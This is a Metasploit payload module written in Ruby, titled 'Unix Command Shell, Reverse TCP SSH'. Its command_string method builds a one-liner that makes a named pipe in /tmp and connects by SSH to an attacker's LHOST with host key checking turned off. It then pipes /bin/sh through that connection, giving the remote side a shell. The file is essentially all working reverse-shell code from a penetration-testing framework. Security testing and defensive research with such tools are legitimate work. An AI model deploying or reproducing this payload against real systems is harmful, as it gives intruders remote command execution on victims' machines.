##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_ssh'

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Reverse TCP SSH',
        'Description' => 'Connect back and create a command shell via SSH',
        'Author' => [
          'RageLtMan <rageltman[at]sempervictus>', # Rex/Metasploit
          'hirura' # HrrRbSsh
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::ReverseSsh,
        'Session' => Msf::Sessions::SshCommandShellReverse,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'ssh',
        'Payload' => { 'Offsets' => {}, 'Payload' => '' }
      )
    )
    register_advanced_options(
      [
        Msf::OptString.new('SshClientOptions', [
          false,
          'Space separated options for the ssh client',
          'UserKnownHostsFile=/dev/null StrictHostKeyChecking=no'
        ]),
        OptString.new('SSHPath', [true, 'The path to the SSH executable', 'ssh']),
        OptString.new('ShellPath', [true, 'The path to the shell to execute', '/bin/sh'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    backpipe = Rex::Text.rand_text_alpha_lower(4..8)
    lport = datastore['LPORT'] == 22 ? '' : "-p #{datastore['LPORT']} "
    opts = datastore['SshClientOptions'].blank? ? '' : datastore['SshClientOptions'].split(' ').compact.map { |e| "-o #{e} " }.join
    "mkfifo /tmp/#{backpipe};#{datastore['SSHPath']} -qq #{opts}#{datastore['LHOST']} #{lport}0</tmp/#{backpipe}|#{datastore['ShellPath']} >/tmp/#{backpipe} 2>&1;rm /tmp/#{backpipe}"
  end
end
